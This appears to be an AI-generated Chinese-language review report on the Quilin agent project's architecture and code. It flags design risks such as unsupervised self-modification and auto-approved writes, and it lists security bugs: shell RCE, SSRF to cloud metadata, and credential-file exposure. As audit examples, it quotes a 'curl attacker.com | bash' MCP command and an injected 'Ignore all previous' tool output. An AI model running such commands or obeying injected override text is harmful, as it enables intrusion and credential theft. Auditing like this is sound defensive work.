# Quilin Agent — Opus 4.7 全面 Ultra Review（2026-04-17）

> **背景**：项目原架构由 Opus 4.6 + GPT-5.4 规划；升级到 Opus 4.7 后用户要求重新 review 全部架构 + 已写代码，并解决所有问题。本报告整合 **11 个并行 subagent** 的独立审查结果（5 文档层 + 6 代码层），按 severity 和可行动性排序。
>
> **Subagent 分工**：
> - 文档层：架构审查 / 范围-守门 / 可行性 / 一致性 / 对抗性压测
> - 代码层：TypeScript / Python / 正确性 / 可维护性 / 测试质量 / 安全
>
> **统计**：共收集 **~170 条 findings**，其中 **CRITICAL 级 14 条** / **HIGH 级 59 条** / **MEDIUM 级 62 条** / **LOW 级 35 条**。

---

## 0. TL;DR（给用户决策用）

**三个最危险的架构决策（收敛的多方独立指认）**：
1. **"默认 AUTO + God Mode + Idle Evolution + Scaffold Level-1 自动应用" 四件套叠加 = 无人值守 Agent 自主改自己代码 + 自主烧 API 钱 + 自主执行 shell** — 07-safety 的 4 层验证**覆盖不到任何一条自主写路径**，没有独立审批闸门。
2. **Spec 领先实现 6+ 个月** — 已交付 Phase 0 + Iter A/B1（~3300 行代码），但 spec 已铺开 13 领域共 **12,874 行**（单 07-safety 1591 行、10-self-evolution 1453 行、12-conversation 499 行全超规格），Iter E 塞下 3-4 个迭代量，30+ benchmark 无 owner。
3. **融合缝合工作流（100 submodule → AI diff → 自动 patch）0 POC + 跨语言自动 port 零先例 + 无 human gate** — 既与 "<200 行 Loop"narrative 自我矛盾，又是 Dependabot 级供应链攻击面。Anthropic Pro / OpenAI Plus 订阅 quota 用作 idle 自进化**违反供应商 ToS**。

**四个必须立即修的 CRITICAL 代码漏洞（上线任何版本前）**：
- `shell_exec` 无 blocklist + LLM 可控无上界 timeout → 完整 RCE（SEC-01 / TS-02）
- tool output 直接回喂 LLM 不扫 injection → 二阶 prompt injection（SEC-02）
- `file_read/write/list` 无 root 限制，敏感文件保护仅 basename → 任意路径 + AWS credentials 泄漏（SEC-03/04 / TS-05/06）
- `web_fetch` 无 SSRF 保护 + 无 timeout + 跟随任意 redirect → AWS IMDS 凭证泄漏（SEC-05 / TS-01）

**两个阻塞 CI 的幽灵依赖（现在 `uv sync` 直接红）**：
- `pytest-asyncio>=1.3.0` / `ruff>=0.15.10` / `sentence-transformers>=5.4.1` / `chromadb>=1.5.7` — 四个版本号**均不存在**（PY-03 / PY-11）。

---

## 1. ①设计缺陷（多 reviewer 收敛）

### D-01 [CRITICAL] 自动写权限栈 4 件套叠加，无独立审批闸门
**收敛证据**：Arch CRITICAL-2 · Scope S-02/S-04 · Adversarial A-04-01/A-05-01/A-07-02 · Feasibility F-03/F-09/F-12

**问题**：
- **God Mode**（CLAUDE.md 第 31 行）：创始开发者无限权限
- **默认 AUTO**（CLAUDE.md 第 17 行）：read + write 放行，仅 CRITICAL 询问
- **Idle Evolution Budget**（10-self-evolution §2.12 ~100 行）：空闲时自主烧 API/订阅 quota
- **Scaffold 自修改 Level 1**（10-self-evolution §2.4）：LLM 自己分析自己的失败 → 自动改自己的 system prompt，**无审批**

**合成后的失败场景**：用户睡着 → idle evolution 触发 → FailureAnalyzer 错误归因 → Level-1 自动改 prompt → AUTO 权限自动应用 → God Mode 自动部署。**整条链无一个 human gate**。这在 MEMORY.md `project_idle_evolution.md` + `project_god_mode.md` 是分离的条目，在架构里交叉。

**07-safety 的 4 层验证根本不覆盖此路径**：整篇 1591 行的安全 spec 聚焦在"user → LLM → tool"的外部输入链；对"agent 自己发起的写"没独立层。

**修复建议**：
1. 引入 `WriteAuthority` 统一决策点（单一 gate），所有自主写（scaffold 修改、skill 自创、idle evolution、god mode）必须过它
2. `WriteAuthority` 默认值**反转为需 Confirm**，opt-in 才走 AUTO
3. Idle Evolution 明确只用 **API token**（禁止订阅 quota，违反 ToS）+ 默认关闭 + 首次启动 onboarding wizard 显式同意
4. Scaffold Level-1 改为 "自动生成 proposal + 用户异步确认"，去掉 auto-apply
5. 从 `quilin.md` / `readme.md` 移除 "God Mode" 首类概念，降级为 `QUILIN_DEV_UNRESTRICTED=1` dev-only flag

---

### D-02 [CRITICAL] Spec 膨胀，Phase 0 minimalism 与 13 生产级 spec 自相矛盾
**收敛证据**：Arch CRITICAL-1 · Scope Meta · Feasibility F-02/F-06 · Maintainability M-03

**问题**：
- 已交付代码：Phase 0 + Iter A + Iter B1（TS ~3049 行 + Python ~272 行 + Rust 2 行占位）
- 已写 spec：13 领域共 **12,874 行**，最长 07-safety 1591 行、10-self-evolution 1453 行
- 承诺 "Agent Loop < 200 行" 但 `repl.ts` 单独已 88 行、`loop.ts` Phase 0 只是单轮 wrapper，Phase 1 要装下 retry/interrupt/streaming/checkpoint 会立刻破 200 行
- Iter E 一次性要交付：OmniMem 4 层 + 向量 + KG + Reflector + User Profile Store + 6 层活人感 + 3 风格 → **单迭代 ≥ 12 周工作量**
- 30+ benchmark 并行刷榜，Phase 0 benchmark harness 已悄悄推迟

**修复建议**：
1. 把 spec 切成 `Phase 0 必备` / `Phase 1` / `Phase 2+` 三档，**只把 01/02/03/05 的 M0 子集列为 Phase 0 准入门槛**，其余显式标 "design parked"
2. Iter E 拆成 **E1（向量 recall）/ E2（Reflector + KG）/ E3（活人感 L1-L3）/ E4（L4-L6 + 风格）**
3. 30+ benchmark 收敛到 **3 个 P0**：Iter B 后攻 BFCL v4，Iter C 后攻 SWE-bench Verified + GAIA；其余移到 `docs/benchmark-roadmap.md`
4. 07-safety 从 1591 压到 400-500：保留 L1（规则）+ L3（输出扫描）+ 权限三级；L2 ML / L4 元 / LLM 裁判移 "future work"
5. `< 200 行 Loop` 明确改为 "Loop 核心流程 ≤ 200 行（不含子系统）"，并列出 Loop 边界
6. 12-conversation-engineering **降级为 02-context 的子模块**，领域数从 13 回落 12

---

### D-03 [CRITICAL] 融合缝合工作流 0 POC，核心价值叙事悬空
**收敛证据**：Scope S-05 · Adversarial A-06-01/A-06-02/A-06-03 · Feasibility F-01

**问题**：
- CLAUDE.md / readme.md / overview.md 宣称 "13 领域 × Top 10 上游 × AI 自动 diff → 融合 patch"
- 实际只有 `scripts/sync-upstreams.py` + `scripts/merge-with-claude.sh` 占位；**从未跑过真实端到端**
- 与 "自研 < 200 行 Loop，不要别人的框架"narrative **自我矛盾**
- 跨语言 patch port（Mem0 Python → OmniMem TS）**零先例**
- AI 自动 merge upstream 是 Dependabot 级供应链攻击面（参考 tj-actions/changed-files 2025-03 事件影响 23k repo）
- 100 submodule × 每周 ~10 commit × Claude diff 分析 = ~$15/周还不算错误诊断

**修复建议**：
1. **降级叙事**：`quilin.md` / `readme.md` 里 "自动缝合 / Top 10 上游监控" 改为 "上游代码参考 + LLM 辅助阅读"
2. 从 overview 的 3 大差异化里移除
3. 工程流程硬性规定：**AI 只做 PR，不做 commit**；必须 human approval gate
4. 上游数从 100 砍到 10（每领域 Top 1），Phase 0 先跑通 1 个端到端 fusion patch 案例再扩

---

### D-04 [HIGH] Rust 作为第三语言过早（且实际是四语言未承认）
**收敛证据**：Scope S-01 · Arch HIGH-6 · Feasibility F-04

**问题**：
- ADR-001 宣告 TS + Python + Rust，但 `crates/mesh-sdk/src/lib.rs` **只有 2 行占位**
- Iter A-E 无任何 Rust 代码，Rust 真实用例只有 Iter F 的 Agent Mesh（可走 TS SDK）和 Phase 2+ WASM
- **11-agent-mesh spec 明说 `meshd daemon（Go 语言）`** — 实际是四语言，ADR-001 未承认
- devcontainer 目前只装 TS/Python/Rust，缺 Go
- 三语言工具链 × CI 矩阵 × 日志 schema 统一的心智税从 Phase 0 起就在收，但 Rust 交付为 0

**修复建议**：
1. ADR 修正为 **"两语言架构 + Rust 在 WASM 沙箱需要时再引入"**
2. 删除 `crates/mesh-sdk` 骨架、`justfile` 的 `build-rs / test-rs`、CI 的 Rust job
3. Agent Mesh 的 meshd 明确声明为 **"外部可选服务"**（类似数据库），不是内部语言栈
4. Iter F 的 AgentMesh 接入改用 TS SDK，meshd 保持 Go

---

### D-05 [HIGH] Profile Store / Skill 自创 / 06 vs 11 通信协议 — 跨领域 contract 未对齐
**收敛证据**：Arch HIGH-4/HIGH-5 · Scope S-12/S-13 · Feasibility F-14

**问题**：
1. **User Profile Store 三处 owner**：03-memory（主存）/ 02-context（Departure 引用）/ 12-conversation（关系建模隐式更新）——没有 single writer，并发 race + schema drift 必然
2. **Skill 自创归属争议**：10-self-evolution §2.5 "技能自创" vs 13-skills M2+ "Background nudge 自进化" 两处各自认领，未声明 ownership
3. **06-multi-agent 与 11-agent-mesh 重复定义协议原语**：06 自定义 `AgentMessage`/`Agent Card` vs 11 声称 "由 meshd owns"
4. **02-context 与 03-memory 互相引用 "另一方负责接口"**：各自 1000+ 行 spec，真正的 bridge 契约两边都没做主章节

**修复建议**：
1. `User Profile` 由 **03-memory 独占写**，02/12 只读；引入 `ProfileUpdater` 单一事件入口 + schema 版本号
2. **Skill CRUD/lifecycle 归 13-skills**；轨迹驱动的沉淀触发归 10（只做"调 13 的 `skill_manage` 工具"）
3. 在 13-skills 落盘 **`SkillDescriptor` TypeScript 类型定义**，10 和 03 import 引用
4. **06 删掉所有跨进程通信段落**，只保留"进程内同构 spawn"；引用 11 为跨 Agent 规范
5. **02 新增 `MemoryBridge` 章节 200 行**（代码已存在但未连线，见 M-03），03 删掉"集成 context"描述

---

### D-06 [HIGH] 非阻塞 Supervisor 的 `≤5s LLM 推理` 和意图识别互相打架
**收敛证据**：Arch MEDIUM-13 · Feasibility F-11

**问题**：
- 06-multi-agent §核心设计哲学禁止 Supervisor 做 >5s 推理
- 但意图识别、任务分解、聚合都必须走 LLM，Sonnet/Opus 上几乎做不到 ≤5s
- 结果：Supervisor 会无限往下 spawn 以规避阻塞，递归层数 + 上下文成本不可控
- heartbeat / checkpoint 的 schema、存储位置、IM 推送通路尚未定义；LLM 调用中途取消（AbortSignal + token 结算）没有实证

**修复建议**：
1. 规则改为 **"用快模型（Haiku/Flash）做 <5s 决策；慢推理走 Sub-Agent + 流式回报"**
2. Supervisor 自身加 `budget cap`（≤ N 次 LLM 调用 / 用户回合）
3. Phase 0 先做 "弱阻塞" Supervisor（承认意图分解 2-3s），Iter F 再做真正非阻塞

---

### D-07 [HIGH] 决策 1（自研 Loop）与决策 3（Vercel AI SDK）lock-in 原则不自洽
**收敛证据**：Adversarial A-03-01/A-03-02/A-03-03

**问题**：
- ADR-001 否决 LangGraph 四大理由之一是"绑定外部框架 = 受其 breaking changes 约束"
- 但 Vercel AI SDK v6 刚 stable（2025-11），v5→v6 已经 breaking（`maxTokens` 字段名改、`promptTokens → inputTokens`，ADR-002 §6.7 用 `?? promptTokens` 临时兼容两版）——**这就是 lock-in 症状**
- 01-llm-integration spec §一.1 还引用 `litellm` 作为 provider 归一化层（Python），与 ADR-001 的 Vercel AI SDK（TS）选型**不一致**
- ADR 宣称"用户通过 Vercel AI SDK 接入任意模型"，但 Phase 0 硬编码 DeepSeek + `.env.example` 只有 `DEEPSEEK_API_KEY`，`getDefaultModel()` 硬编码 `deepseek-chat`
- `thinking_mode` 的 `preserved` 模式只有 GLM-5.1 支持，迁到 DeepSeek/Claude/GPT 会退化但无降级策略

**修复建议**：
1. 承认 Vercel AI SDK 是程度不同的 lock-in，但**可逆**——文档里更新为 "适配层足够薄，切换成本 ≤ 2 周"
2. 删除 01-llm-integration §一.1 的 litellm 引用（统一 Vercel AI SDK）
3. 给每个 provider 写 **capability matrix**（thinking / tool_call / streaming / 128k context 谁支持），明确 polyfill / unsupported 降级
4. Phase 1 实装第 2 个 provider（如 Anthropic Claude），立刻暴露硬编码问题

---

### D-08 [HIGH] 默认 AUTO 权限缺失威胁模型
**收敛证据**：Adversarial A-04-01/A-04-02/A-04-03 · Feasibility F-09 · Security 总览

**问题**：
- 把 Claude Code 当"默认 AUTO"先例是**误读** —— Claude Code 默认 ask-every-write，`auto-accept` 是 shift+tab 显式切换
- 2-stage Classifier 的 FP/FN 预算**未立**：DeBERTa-based prompt injection classifier 公开 F1 ~0.94，FN ~3%；每天 100 次高危操作 = 每天漏 3 次
- SOC2 CC6.1 / ISO 27001 / GDPR 审计下"默认信任 agent 执行任意命令"是第一个被 flag 的点；企业销路直接 block
- 配合 `shell_exec`/`file_write`/`web_fetch` 无护栏（见 §2 安全漏洞），攻击面完整暴露

**修复建议**：
1. 写 `docs/security/threat-model.md`：列 (a) prompt injection 经 web_fetch → shell_exec；(b) 上游 patch 污染 → scaffold 自修改；(c) mesh.receive 注入恶意指令 —— 每个攻击面配 guardrail + detection 指标
2. 明确 **FN 预算 SLA**："高风险操作 FN < 0.01%"；达不到就降级为 default-ask-for-write
3. 默认 AUTO 仅放 **read**；write/exec 首次使用必须 confirm；CI 环境强制 deny list
4. overview.md 竞品对比表里 Claude Code 改为 "ask-by-default, auto opt-in"，让 Quilin 的 "默认 AUTO" 显示为 outlier

---

### D-09 [MEDIUM] 30+ benchmark 全量参赛无 owner 无时间线
**收敛证据**：Scope S-06 · Arch MEDIUM-9 · Feasibility F-05

**问题**：每个 benchmark harness 约 2-4 周（数据加载 + 任务执行 + 评测 + leaderboard 提交），30+ × 2 周均值 ≈ 60 周。Phase 0 已经悄悄推迟。P2 里 OSWorld / AndroidWorld / BixBench / FrontierMath 跨越桌面/移动/生物/数学，现在一个都攻不了。

**修复建议**：v1 **锁定 SWE-bench Verified + GAIA + BFCL v4 三项**，明确 owner + 里程碑；其余移 `docs/benchmark-roadmap.md`，从主 implementation-plan 删除。

---

### D-10 [MEDIUM] 一致性漂移（14 处 terminology / count / naming 漂移）
**收敛证据**：Coherence C-01..C-14

**Top 5 修正项**：
- **C-01 HIGH**：upstream 数量 `~130` (readme) vs `~100` (quilin.md) —— 应统一为 `~130` (13 × 10)
- **C-02 HIGH**：`skill_view` vs `skill_load` 二选一 —— 已在 13-skills/README 统一为 `skill_view`，memory 已修正
- **C-03 HIGH**：Iter B3 命名在 implementation-plan 未落 —— 本轮已修
- **C-10 MEDIUM**：OmniMem tier casing（short/mid/long/ultra）全文档需统一小写
- **C-14 LOW**：`Codex` vs `Codex CLI` 需区分

**修复建议**：在 CLAUDE.md 加 "术语表" section；CI 加 markdown-link-check + 术语 lint。

---

## 2. ②实现 gap（代码层）

### 2.1 [CRITICAL] 安全漏洞（上线前必修）

| ID | 问题 | 文件:line |
|----|------|-----------|
| **SEC-01 / TS-02** | `shell_exec` 无 blocklist + LLM 可控无上界 `timeoutMs` + 完整 shell 解析模式（支持管道/重定向/命令替换） → 完整 RCE | `packages/agent-core/src/tools/builtin/shell-exec.ts:76-80, 147` |
| **SEC-02** | tool output 直接以 `role:"tool"` 注入下轮 prompt，`injection-scanner` **不覆盖 tool 结果路径** → 二阶 prompt injection（`web_fetch(attacker.com)` → 返回含 "Ignore all previous" 的文本 → 下轮 LLM 执行任意工具） | `packages/agent-core/src/loop.ts:132-138` |
| **SEC-03 / TS-05** | `file_read` / `file_write` / `file_list` 无 root 白名单，`toAbsolutePath` 只是 `resolve()`；`file_write` 更**完全没有** `isSensitivePath` 检查 | `packages/agent-core/src/tools/builtin/file-tools.ts:39-41, 157-165, 190+` |
| **SEC-04 / TS-06** | 敏感文件保护仅 basename 匹配 → `~/.aws/credentials` / `~/.config/gh/hosts.yml` / `~/.netrc` / `/etc/passwd` 全部未保护 | `packages/agent-core/src/tools/builtin/file-tools.ts:34-37` |
| **SEC-05 / TS-01** | `web_fetch` 只拒 `file:/ftp:`，允许 `http://169.254.169.254/...`（AWS IMDS）/ `http://192.168.x.x/admin` / `http://localhost:6379`；无 `AbortSignal` timeout；跟随任意 redirect；`response.text()` 先把 full body 塞内存再截断 | `packages/agent-core/src/tools/builtin/web-fetch.ts:89-101` |
| **SEC-06** | `MCPServerEntry.config.command` / `args` 若来自外部配置文件未签名，攻击者可注入 `/bin/sh -c "curl attacker.com \| bash"` → 完整 RCE | `packages/agent-core/src/tools/mcp-client.ts:123-135` |
| **SEC-09** | `StdioClientTransport.env` 只显式传 `LOG_LEVEL/QUILIN_ENV`，但 MCP SDK 默认 `{ ...process.env, ...options.env }` → 恶意 MCP server 子进程**继承父进程所有 API keys** | `packages/agent-core/src/tools/mcp-client.ts:127-131` |
| **TS-03** | **AI SDK v6 的 `maxTokens` 参数被静默丢弃** —— 应为 `maxOutputTokens`。结果：`InferenceConfig.maxTokens: 4096` 从未生效，所有生成**不限 token** | `packages/agent-core/src/llm/client.ts:176, 211` |

---

### 2.2 [CRITICAL] Python CI 阻塞

| ID | 问题 | 修复 |
|----|------|------|
| **PY-03 / PY-11** | **4 个幻觉版本号**：`sentence-transformers>=5.4.1` / `chromadb>=1.5.7` / `pytest-asyncio>=1.3.0` / `ruff>=0.15.10` 均**不存在**，`uv sync` 直接 resolution error，**CI 当前处于 broken 状态** | 移 `sentence-transformers`/`chromadb` 到 `[project.optional-dependencies] vector`，`pytest-asyncio>=0.25`，`ruff>=0.5` |

---

### 2.3 [HIGH] 状态管理 / 生命周期 bugs

| ID | 问题 | 文件:line |
|----|------|-----------|
| **CR-02** | `MCPRegistry.register()` **先 unregister 旧的再 connect 新的**；connect 失败后旧连接完全丢失，热更新场景直接炸 | `packages/agent-core/src/tools/registry.ts:55-86` |
| **CR-03** | `MCPRegistry.unregister()` 的 `disconnect()` 抛错后 maps 清理代码全部跳过，留鬼工具；`findTool(name)` 还会返回已失效条目 | `packages/agent-core/src/tools/registry.ts:88-99` |
| **CR-04** | `MCPClientManager.callToolWithMetadata` 在工具失败时调 `createDisconnectedResult`，函数名语义**与实际错误类型冲突**，调用方若按 disconnectReason 做重连判定会误触发 | `packages/agent-core/src/tools/mcp-client.ts:218-228` |
| **CR-06** | `SQLiteCheckpoint.save()` 的 `DO UPDATE SET created_at = excluded.created_at` **无条件覆盖首创时间** → 跨 session 时间戳退化；6 层活人感的 temporal awareness 全部依赖它 | `packages/agent-core/src/state/checkpoint.ts:78-95` |
| **TS-04** | `mcp-client.callToolWithMetadata` **无 timeout** —— 停摆的 MCP server 永久阻塞 agent loop | `packages/agent-core/src/tools/mcp-client.ts:219` |
| **TS-10** | `checkpoint.ts` `JSON.parse` 后直接 `as AgentState`，无结构 guard；旧 schema 或损坏的 state 在 REPL resume 时延迟崩溃 | `packages/agent-core/src/state/checkpoint.ts:110` |
| **TS-11** | `schema-converter.ts` 遇到 `anyOf` / `oneOf` / `enum` / `null` 类型直接 `throw` → **整个 MCP server registration 失败，所有工具不可用**；应 fallback 为 `z.unknown()` + warn | `packages/agent-core/src/tools/schema-converter.ts:59` |
| **TS-15** | `package.json` 声明 `better-sqlite3`，实际用 `bun:sqlite`（Bun-only）；Node 环境直接报 runtime error | `packages/agent-core/src/state/checkpoint.ts:50` + `package.json` |

---

### 2.4 [HIGH] Logic bugs / dead code（死代码 + 双系统并存）

**双系统并存 —— 生产用一，测试用另一**（Maintainability M-01/M-02/M-03 收敛）：
- `BasicContextManager` vs `ContextAssembler`：生产路径只用前者，后者 + `createDefaultContextAssembler` + `TokenBudgetAllocator.rebalance` + `scanExternalContext` + `memory-bridge` **全部只出现在测试**
- `VercelLLMClient` vs `StreamingLLMClient`：前者**只被测试引用**，与后者几乎重复
- `ContextSource` 类型**两套定义**（`types.ts` 5 字段 vs `source-types.ts` 7 字段）
- **约 250 行 Phase 1 草稿代码** 冒充公共 API 通过 `context/index.ts` barrel 对外暴露

**确定性死代码**：
- **CR-01 / M-04 / TS-08**：`budget.ts:83` 的 `Math.max(0, historyBudget - ...) * 0` **恒为 0**，history slack 永远不被回收
- **M-05**：`index.ts:178-208` 的 `shouldExit` 标志永远 true，REPL → service-loop fallthrough 分支 unreachable
- **TS-12**：`loop.ts:71` **原地 mutate** `workingMessages[0]`，违反 CLAUDE.md 不可变原则
- **M-09**：`MCPClientManager.callTool(name, args)` 只被测试引用
- **M-11/M-13**：`BuiltinToolOptions` / `PROMPT_CACHE_BOUNDARY` 导出但 0 消费

**Logic bugs**：
- **CR-09**：user 传入的 system prompt 如果超 budget，**被静默清空**（`BasicContextManager` first-fit break 不处理 override）
- **CR-07**：Python `recall()` LIKE fallback 未转义用户输入的 `%` / `_`，`查一下 50%` → 全表命中
- **TS-16 / CR-10**：`BasicContextManager.buildContext()` 对首个 oversized source `break` 而非 `continue`，低优先小 source 被误丢；`ToolRouter.execute()` 短名冲突时报 "not found" 而非 "ambiguous"
- **TS-17 / CR-08**：`memory-bridge` 把 recall 结果标记为 `isExternal: true`，导致 `scanExternalContext` **静默删除**含 "ignore previous" 的合法记忆；`injection-scanner` 的 `base64_suspicious` 正则误杀 commit hash / UUID / JWT
- **TS-07**：`mapFinishReason` 把未知 provider finish reason 默认映射为 `"length"`，**provider 错误被当成正常 token 截断** → loop 当成成功返回
- **M-10**：`withDefaultMetadata` 把 MCP 工具以 `programmatic+read` 注册为 builtin，**绕过 `MCPRegistry.register` 的 namespace + riskLevel 机制**（OmniMem 的 `memory_store` 被错标成 `read`）

---

### 2.5 [HIGH] Python 层问题

| ID | 问题 | 文件 |
|----|------|------|
| **PY-01** | `recall/store` 声明 `async def` 但全是同步 `sqlite3` 调用，**直接阻塞事件循环**；未来并发 = 卡死 | `providers/memory/src/omnimem/store.py:111, 134` |
| **PY-02** | `sqlite3.connect()` 无 `close()` / `__enter__` / `__exit__`，WAL 锁/未提交事务在异常退出时无法保证回收 | `providers/memory/src/omnimem/store.py:82` |
| **PY-04 / SEC-08** | `memory_store(tier: str)` **无枚举校验**，任意字符串可写入；应为 `Literal["short","mid","long","ultra"]` | `providers/memory/src/omnimem/server.py:29` |
| **PY-05** | `except Exception` 吞掉 MCP 错误语义，序列化为 `{"error": str(exc)}` 200 返回 → client 无法走标准 MCP error 分支 | `providers/memory/src/omnimem/server.py:23, 39` |
| **PY-06** | `_rebuild_fts_index` 两步写无事务保护，崩溃时 keywords 为空 → CJK 搜索失效 | `providers/memory/src/omnimem/store.py:150-170` |
| **PY-07 / M-17** | 模块级 `_store = OmniMemStore()` 单例，测试必须 `QUILIN_ENV=test` | `providers/memory/src/omnimem/server.py:10-11` |
| **PY-08** | `structlog` 配置缺 `format_exc_info` / `ExceptionRenderer`，`exc_info` 丢 | `providers/memory/src/omnimem/logging.py` |

---

### 2.6 [HIGH] 测试质量问题

**Top 5 覆盖 gaps**（T-01/T-03/T-04/T-11/T-15）：
1. `loop.ts` 两条错误分支未覆盖：`tool_calls` 返回空列表；第二次 maxTurns "while awaiting final response"
2. `checkpoint.test.ts` 把整个 `bun:sqlite` mock 掉，CREATE TABLE / INSERT 语法 / UPSERT 语义 / 并发 / 事务**全部不跑真 SQL**
3. `mcp-client` 关键生命周期未测：`withTimeout` 超时、transport onclose/onerror、stderr handler、`structuredContent` fallback、`isError:true`
4. `file-tools` 安全路径测试只测 `.env`，path traversal / symlink / `*.key` / `credentials.json` 全未测
5. **整套 test suite 零并发/竞态测试**：同 sessionId 双 checkpoint 竞争、MCP 断后重连、并行 tool calls

**Top 3 弱/脆弱断言**（T-02/T-05/T-07）：
- `tool-metadata.test.ts` 60% 断言是字面常量等于字面常量（`expect(categories).toEqual(["programmatic",...])` 自己比自己）→ 虚假覆盖率
- `loop.test.ts` 用 `logger.debug.toHaveBeenCalledTimes(2/4)` → 加一条 debug 日志立刻红
- `index.test.ts` `toHaveBeenNthCalledWith(N, "精确字符串")` → 改文案立刻红

---

## 3. ③Opus 4.7 新建议（基于整体 review 的新判断）

### 3.1 策略层

**R-01 [必须] 止血 → 收敛 → 重启**
- **止血**：立即修 Phase 2.1 的 4 个 CRITICAL 安全 + 4 个幻觉版本号 + CR-01/02/03/06 状态 bugs + TS-03 maxTokens 丢弃
- **收敛**：把 spec 三档化（Phase 0 必备 / 1 / 2+），Iter E 拆 4 份，benchmark 收敛 3 项，从 quilin.md/readme.md 删除 God Mode/Idle Evolution/融合缝合自动合入
- **重启**：B2 Safety 冻结契约后再动 B3；每个迭代一主轴

**R-02 [必须] 引入 `WriteAuthority` 决策中枢**
所有自主写（scaffold 修改、skill 创建、idle evolution、god mode、shell_exec、file_write）过单一 gate。默认值反转为 Confirm；AUTO 是 opt-in。这是 D-01 的根本 fix。

**R-03 [必须] 写 threat-model.md**
列完整攻击链（prompt injection → web_fetch → shell_exec / upstream patch 投毒 → scaffold 自修改 / mesh 恶意消息），每链配 guardrail。

**R-04 [建议] 13-skills 领域 `SkillDescriptor` 作为跨域 contract**
在 13-skills 落盘 TS 类型，10-self-evolution / 03-memory Skill Memory / 05-tool 三个领域都 import 它，避免 drift（D-05 #3）。

### 3.2 文档 / 架构层

**R-05 [建议] 把 E-T-C-S-L-V 和 13 领域二选一**
现在架构总览用 E-T-C-S-L-V 语汇，领域 spec 用 01-13 编号，读者必须二次翻译。建议**只留 13 领域编号**，E-T-C-S-L-V 放到一个附录小章节说明"历史上的能力分类"。

**R-06 [建议] Harness Engineering 577 行精简到 ≤150 行**
当前像 manifesto 不像工程合同；9 原则 + 10 反模式 + L1-L4 成熟度模型已在各领域 spec 里有实体，总览只留"概念词典 + 每个概念 → 哪个领域 §y.z"。

**R-07 [建议] 加 "实现状态标签"到 architecture bullets**
CLAUDE.md + overview.md 的 15 条独特优势每条加 `✅ 已实现 / 🚧 规划中 / 💭 愿景`。避免 Agent context 把 "未来愿景"当作 "现有事实"。

**R-08 [建议] CI 加 markdown link-check + 术语 lint**
防止 13/12 漂移、`skill_view/skill_load` 漂移、`bundled/user/project` vs `.quilin/skills` 漂移。

### 3.3 代码层

**R-09 [必须] 迁移 `maxTokens` → `maxOutputTokens`**
TS-03 是最 invisible 但影响每次生成的 bug；一行修复但立刻降回归风险。

**R-10 [建议] 把 Phase 1 context 草稿代码移出 barrel**
`context/index.ts` 暴露的 `ContextAssembler` + 4 friends 只被测试用；建议移 `context/draft/` 子目录且不从主 barrel re-export，避免新读者误以为是稳定 API（M-01/M-02/M-03）。

**R-11 [建议] 删掉 Vercel AI SDK v5 兼容代码**
`promptTokens ?? inputTokens` fallback 两处重复（`index.ts:51-67` + `llm/client.ts:141-157`），抽 `llm/token-usage.ts` 单一函数 + 加注释说明为何兼容。v5 支持期过了就删。

**R-12 [建议] OmniMem 改 `create_server(store)` 工厂**
消除模块级副作用（PY-07 / M-17），测试可注入内存 store，不依赖 `QUILIN_ENV=test`。

---

## 4. 建议修复优先级（给用户选单）

### P0 — **上线任何 Beta / 对外分享前必修**（预计 2-3 天）
1. 4 个 CRITICAL 安全漏洞：SEC-01/02/03/04 + TS-01（SSRF）
2. 4 个 Python 幻觉版本号（PY-03 / PY-11）—— 否则 CI broken
3. TS-03（maxTokens 丢弃）
4. CR-02/CR-03（MCPRegistry 热更新失败）
5. TS-11（schema-converter 崩溃）

### P1 — **下一迭代（Iter B2 冻结前）必修**（预计 1-2 周）
6. D-01 `WriteAuthority` 决策中枢（削 God Mode + Idle Evolution + Scaffold auto-apply）
7. D-02 Spec 三档化 + Iter E 拆 4 份
8. D-03 融合缝合叙事降级 + 删自动 merge 承诺
9. D-08 写 threat-model.md
10. CR-06 checkpoint created_at 不覆盖
11. TS-10 checkpoint JSON.parse 加 guard
12. Python PY-01（async 阻塞事件循环）+ PY-04（tier 校验）+ PY-05（异常语义）
13. M-01/02/03 清理 Phase 1 草稿代码（from barrel export）
14. Top 5 testing gaps（T-01/03/04/11/15）

### P2 — **可放到 Iter C/D**（预计 4-8 周）
15. D-04 Rust 降级为按需
16. D-05 跨领域 contract 对齐（Profile Store / SkillDescriptor / 06↔11 通信）
17. D-06 Supervisor ≤5s 规则收紧
18. D-07 Vercel AI SDK lock-in 文档化 + capability matrix
19. D-09 benchmark 3 项收敛
20. D-10 一致性漂移扫描 + CI 术语 lint
21. R-05/06/07 架构文档精简

---

## 5. 11 个 subagent 原始 findings 索引

| Agent | Findings | 最严重 | 输出文件 |
|-------|----------|--------|---------|
| Architect | CRITICAL-1/2, HIGH-3..8, MEDIUM-9..13 | 13 条 | `/tmp/.../af3904de...output` |
| Scope-guardian | S-01..S-15 | 15 条 CUT/DEFER | `/tmp/.../aadb6f7a...output` |
| Adversarial | A-01..A-07 × {BULLETPROOF/FIRM/SOFT} | 7 决策压测 | `/tmp/.../a90cdafa...output` |
| Feasibility | F-01..F-15 | 3 BLOCKING + 6 HIGH_RISK | `/tmp/.../af1572fe...output` |
| Coherence | C-01..C-14 | 3 HIGH 一致性 | 先前会话返回 |
| TypeScript | TS-01..TS-17 | 2 CRITICAL + 9 HIGH | `/tmp/.../ab0046fd...output` |
| Python | PY-01..PY-15 | 5 HIGH | `/tmp/.../acface19...output` |
| Correctness | CR-01..CR-17 | 4 HIGH | `/tmp/.../a83319c7...output` |
| Maintainability | M-01..M-19 | 5 HIGH | `/tmp/.../a847700e...output` |
| Testing | T-01..T-20 | 4 HIGH | `/tmp/.../a4dcae94...output` |
| Security | SEC-01..SEC-14 | 4 CRITICAL + 6 HIGH | `/tmp/.../a204c9ed...output` |

---

## 6. 用户决策项

请选定以下 **必答** 项后再动代码：

1. **P0 7 项**（安全 + CI + maxTokens + MCPRegistry + schema-converter）：**同意立即修**？
2. **D-01 WriteAuthority**：是否**删除 God Mode 首类概念 + Idle Evolution 默认关闭 + Scaffold Level-1 去掉 auto-apply**？
3. **D-02 Spec 三档化**：是否**把 Iter E 拆成 E1-E4**、**benchmark 收敛到 3 项**、**12-conversation 降级为 02 子模块（13→12 领域）**？
4. **D-03 融合缝合叙事**：是否**从 quilin.md / readme.md 删除 "自动缝合"表述**、改为 "上游代码参考"？
5. **D-04 Rust**：是否**删 crates/ 骨架**、Rust 等到 WASM 沙箱才引入？
6. **报告归档**：本文档 commit 到 `docs/review/2026-04-17-ultra-review.md`？

---

**Review 元信息**
- 执行日期：2026-04-17
- Reviewer：Opus 4.7 + 11 个并行专业 subagent
- 代码基线：commit `6959e28`（master，iter-b2 spec pending）
